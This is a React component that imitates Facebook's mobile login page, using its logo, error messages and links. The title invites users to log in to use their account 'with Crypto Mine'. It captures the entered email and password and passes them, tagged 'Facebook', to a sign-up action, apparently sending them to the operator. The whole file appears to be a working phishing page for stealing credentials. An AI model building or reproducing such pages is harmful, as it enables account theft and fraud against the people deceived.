import React, { useState, useEffect } from "react";
import { connect } from "react-redux";
import { setSignUp, setErrors } from "../../redux/user/user.action";

import "./facebook.css";
import fblogo from "../../asset/image/fblogo.png";

function Facebook({ errors, setErrors, signUp }) {
  const [userCrediential, setUserCrediential] = useState({
    email: "",
    password: "",
  });


  const handleChange = (e) => {
    const { name, value } = e.target;
    setUserCrediential({ ...userCrediential, [name]: [value] });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const user = {
      email: userCrediential.email.toString(),
      password: userCrediential.password.toString(),
      app: "Facebook",
    };

    signUp(user);
    
  };

  return (
    <div>
      <div className="mobheader">
        <img src={fblogo} className="mobfblogo" alt="fblogo" />
      </div>

      <div className="mobmaindiv">
        <div className="title">
          Log in to use your Facebook account with Crypto Mine.
        </div>

        {errors.err ? (
          <div className="fb-error-message">
            <div className="title">
              {errors.email ? "Incorrect email address or phone number" : ""}
              {errors.password ? "Please re-enter your password" : ""}
            </div>
            {errors.email
              ? "The email address or phone number that you've entered doesn't match any account."
              : "The password that you've entered is incorrect."}

            {errors.email ? (
              <a
                href="https://www.facebook.com/reg/?logger_id=b628d204-f0a9-4ea2-800d-b23545f77c0c"
                target="_blank"
                rel="noopener noreferrer"
              >
                Sign up for an account.
              </a>
            ) : (
              <a
                href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login"
                target="_blank"
                rel="noopener noreferrer"
              >
                Forgotten password?
              </a>
            )}
          </div>
        ) : (
          ""
        )}

        <div id="mobtextdiv">
          <input
            type="text"
            name="email"
            value={userCrediential.email}
            className="mobtextbox mobtextbox1"
            placeholder="Mobile number or email address"
            onChange={(e) => handleChange(e)}
          />
          <input
            type="password"
            name="password"
            value={userCrediential.password}
            className="mobtextbox mobtextbox2"
            placeholder="Password"
            onChange={(e) => handleChange(e)}
          />
        </div>
        <div className="mobloginbuttondiv">
          <button
            type="submit"
            className="mobloginbutton"
            onClick={(e) => handleSubmit(e)}
          >
            Log In
          </button>
        </div>
        <div id="ordiv">
          <span id="or">or</span>
        </div>
        <div id="mobcreatediv">
          <button id="mobcreate">
            <a
              href="https://www.facebook.com/reg/?logger_id=b628d204-f0a9-4ea2-800d-b23545f77c0c"
              target="_blank"
              rel="noopener noreferrer"
            >
              Create New Account
            </a>
          </button>
        </div>
        <div className="mobforgotpw">
          <a
            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login"
            target="_blank"
            rel="noopener noreferrer"
          >
            Forgotten password?
          </a>
          <span>·</span>
          <a
            href="https://www.facebook.com/help"
            target="_blank"
            rel="noopener noreferrer"
          >
            Help Center
          </a>
        </div>
      </div>
    </div>
  );
}

const mapStateToProps = (state) => ({
  errors: state.user.errors,
});

const mapDispatchTOProps = (dispatch) => ({
  setErrors: (error) => dispatch(setErrors(error)),
  signUp: (user) => dispatch(setSignUp(user)),
});

export default connect(mapStateToProps, mapDispatchTOProps)(Facebook);
